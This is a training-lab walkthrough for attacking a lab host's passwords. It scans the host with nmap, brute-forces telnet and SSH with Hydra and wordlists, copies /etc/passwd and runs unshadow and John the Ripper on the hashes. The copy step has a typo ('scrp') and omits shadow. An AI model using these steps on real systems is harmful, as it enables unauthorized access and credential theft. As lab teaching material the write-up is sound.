# Bruteforce and Password Cracking

# Description

The lab is divided in two main parts:

- Network authentication cracking
- Bruteforce and password cracking

In the first part of the lab you will have to use different network authentication cracking techniques and tools against services available on the target machine. 

Once valid credentials have been found, it is time to download the passwords stored on the remote system and use John the Ripper to crack them!

# Goal

The final goal of the lab is retrieve the passwords of at least ten users on the target machine!

# Tools

**The best tools for this lab are:**

- Network authentication cracking tools such as *Hydra*
- Cracking tools such as *John the Ripper*

# Solutions

### Steps - 1 Find alive hosts on the network

We first need to verify which the remote network is. We can do it by running ***ifconfig*** and check the IP address of our tap0 interface.

![Bruteforce%202018e/Untitled.png](Bruteforce%202018e/Untitled.png)

As we can see the target network is **192.168.99.0/24.** Let's run *nmap* in order to discover available hosts on the network:

![Bruteforce%202018e/Untitled%201.png](Bruteforce%202018e/Untitled%201.png)

The previous screenshot shows that the only host alive in the network is 192.168.99.22 (besides our host: 192.168.99.16).

### Step 2 - Port Scanning and Service Detection

Let us target the host found in the previous step and check what ports are open and services it has running:

```jsx
nmap -sV 192.168.99.22
```

![Bruteforce%202018e/Untitled%202.png](Bruteforce%202018e/Untitled%202.png)

From the nmap output, we can see that the host has two services enabled: **SSH and Telnet.**

### Step 3 - Bruteforce

It is time to get our hands dirty! Let us try to bruteforce both telnet and SSH in order to find any working pair of username and password. To do this we are going to use **Hydra**.

For the telnet service, let us use the following command and see what we get:

```bash
hydra
-L /usr/share/ncrack/minimal.usr
-P /usr/share/seclists/Passwords/rockyou-10.txt
telnet://192.168.99.22
```

**NOTE**:

<aside>
💡 Before you use minimal.usr, check for any unnecessary entries and remove them.

</aside>

Specifically, if you are using **minimal.usr** for the first time, it may contain the following entry at the beginning of the list:

```bash
# minimal list of very common usernames
```

**If this entry exists, remove it otherwise Hydra will not work as expected.**

As we can see in the following screenshot, we are able to find some valid username/password pairs. For our testing purposes, they are enough, so we can stop the bruteforce.

![Bruteforce%202018e/Untitled%203.png](Bruteforce%202018e/Untitled%203.png)

Let us confirm that at least one of these two credentials works with the following command:

```bash
telnet 192.168.99.22 -l sysadmin
```

![Bruteforce%202018e/Untitled%204.png](Bruteforce%202018e/Untitled%204.png)

Let us now focus our test on the **SSH** service. In the same way we did with telnet, let us use Hydra to bruteforce the SSH service with the following command:

```bash
hydra
-L /usr/share/ncrack/minimal.usr
-P /usr/share/seclists/Passwords/rockyou-15.txt
192.168.99.22 ssh
```

<aside>
💡 If you use older versions of Hydra, please add -t 8 to the previous command. This option sets the number of parallel tasks to 8.

</aside>

 

As we can see in the results, Hydra found valid credentials for the SSH service.

![Bruteforce%202018e/Untitled%205.png](Bruteforce%202018e/Untitled%205.png)

Once again let us verify that these credentials work on the remote system:

![Bruteforce%202018e/Untitled%206.png](Bruteforce%202018e/Untitled%206.png)

### Step 4 - Download and crack the local password on the system

Now that we have SSH access on the machine, we can try to crack the password of the local user accounts. To do this we first need to download two files from the victim: *passwd and shadow.*

In order to download these two files1 we can use the scp (secure copy) command as follow:

```bash
scrp root@192.168.99.22:/etc/passwd .
```

![Bruteforce%202018e/Untitled%207.png](Bruteforce%202018e/Untitled%207.png)

Now that we have these files into our local machine, we can use **john the ripper** and
**unshadow** to crack the user passwords. First let us use unshadow to get the password
hashes:

```bash
unshadow passwd shadow > to_crack
```

![Bruteforce%202018e/Untitled%208.png](Bruteforce%202018e/Untitled%208.png)

Now that we have the password hashes stored in the file named *to_crack,* we can use John
the Ripper to crack them:

```bash
john to_crack
```

![Bruteforce%202018e/Untitled%209.png](Bruteforce%202018e/Untitled%209.png)